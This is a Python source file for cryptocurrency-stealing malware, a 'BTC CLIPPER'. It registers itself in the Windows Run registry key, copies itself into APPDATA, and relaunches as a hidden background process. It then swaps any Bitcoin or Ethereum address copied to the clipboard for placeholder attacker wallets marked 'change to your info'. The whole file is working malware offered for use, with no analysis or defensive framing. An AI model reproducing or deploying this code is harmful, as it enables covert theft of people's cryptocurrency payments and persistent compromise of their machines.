import os, sys, re, time, subprocess, logging

logging.basicConfig(filename="handler.log", level=logging.INFO, format='%(asctime)s %(message)s')

def IsWindows():
    try:
        if os.name == "nt":
            import winreg, ctypes
            logging.debug('Adding to startup registry')
            path = os.getenv('APPDATA')

            logging.debug(path)

            file_name = sys.argv[0]

            address = os.getenv(
                'LOCALAPPDATA') + '\\Programs\\Python\\Launcher\\py.exe' + ' ' + '-i ' + '"' + path + '\\' + file_name + '"'

            key1 = winreg.HKEY_CURRENT_USER
            key_value1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

            open_ = winreg.CreateKeyEx(key1, key_value1, 0, winreg.KEY_WRITE)

            if open_:
                logging.debug('Registry Key created')

            winreg.SetValueEx(open_, "BTC CLIPPER", 0, winreg.REG_SZ, address)

            open_.Close()

            virus_code = []

            with open(sys.argv[0], 'r', encoding='utf-8') as f:
                lines = f.readlines()
                for line in lines:
                    virus_code.append(line)

            path = os.getenv('APPDATA') + '\\'
            hide_path = os.getenv('APPDATA') + '\\' + sys.argv[0]  # BACK
            logging.debug('Hide path: %s ' % hide_path)

            with open(hide_path, 'w', encoding='utf-8') as f:
                for line in virus_code:
                    f.write(line)
                    if line == 'FirstTime = True\n':
                        logging.debug(line)
                        f.write('FirstTime = False\n')

            logging.debug('Finished replicating to APPDATA')

    except Exception as e:
        logging.error("Directory / startup registry err {}".format(str(e)))

class Handler:
    def __init__(self):
        self.btc_pattern = r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$|^(bc1)[0-9a-zA-HJ-NP-Z]{11,71}$'
        self.eth_pattern = r'^0x[a-fA-F0-9]{40}$'
        self.addrs = ["EtheriumWalletHere", "BitcoinWalletHere"] # change to your info
        try:
            global pyperclip
            import pyperclip
        except ModuleNotFoundError:
            try:
                os.system("pip install pyperclip")
                os.execl(sys.executable, sys.executable, *sys.argv)
            except Exception as e:
                logging.error(f"Failed to install or execute pyperclip: {e}")
                sys.exit(1)

    def read(self):
        """Reads the clipboard and checks if 'btc', 'eth', or invalid based on the address style"""
        try:
            address = pyperclip.paste()
            if re.match(self.btc_pattern, address):
                return "btc"
            elif re.match(self.eth_pattern, address):
                return "eth"
            return "nil"
        except Exception as e:
            logging.error(f"Failed to read clipboard: {e}")
            return "nil"

    def write(self):
        """Writes address to the clipboard based on the address type read """
        address_type = self.read().strip()
        try:
            if address_type == "eth":
                pyperclip.copy(self.addrs[0])
            elif address_type == "btc":
                pyperclip.copy(self.addrs[1])
        except Exception as e:
            logging.error(f"Failed to write to clipboard: {e}")

def run():
    if len(sys.argv) == 1:
        try:
            if os.name == "posix":
                subprocess.Popen([sys.executable] + [sys.argv[0], 'bg'] + sys.argv[1:],
                                 close_fds=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
            elif os.name == "nt":
                IsWindows()
                subprocess.Popen([sys.executable] + [sys.argv[0], 'bg'] + sys.argv[1:],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

        except Exception as e:
            logging.error(f"Failed to run in background: {e}")
        sys.exit(0)

if __name__ == "__main__":
    run()
    while True:
        handler = Handler()
        handler.write()
        time.sleep(0.5)
